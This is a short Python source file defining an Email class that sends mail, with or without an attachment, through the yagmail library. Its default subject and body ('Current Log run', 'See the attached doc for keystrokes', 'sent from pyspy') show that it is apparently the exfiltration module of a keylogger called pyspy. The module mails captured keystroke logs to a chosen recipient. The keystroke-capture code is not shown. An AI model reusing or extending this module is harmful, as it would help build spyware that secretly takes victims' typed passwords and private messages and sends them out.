# import used to send emails
import yagmail

class Email:
    """
    Class used to send emails using a specified email domain
    """
    def __init__(self, my_email, to_email):
        """
        my_email: email of the sender
        to_email: email of the recipient
        """
        self.my_email = my_email  # sender
        self.to_email = to_email  # recepient email

    def send_email_with_file(self, filename, this_subj="Current Log run", body="See the attached doc for keystrokes"):
        """
        Sends email with attacachment to the specified reciever email
        """
        yag = yagmail.SMTP(self.my_email)
        yag.send(
            to=self.to_email,
            subject=this_subj,
            contents=body, 
            attachments=filename
        )
    
    def send_email(self, this_subj="Current Log run", body="See the attached doc for keystrokes\n-sent from pyspy"):
        """
        Sends email to the specified reciever email
        """
        yag = yagmail.SMTP(self.my_email)
        yag.send(
            to=self.to_email,
            subject=this_subj,
            contents=body, 
        )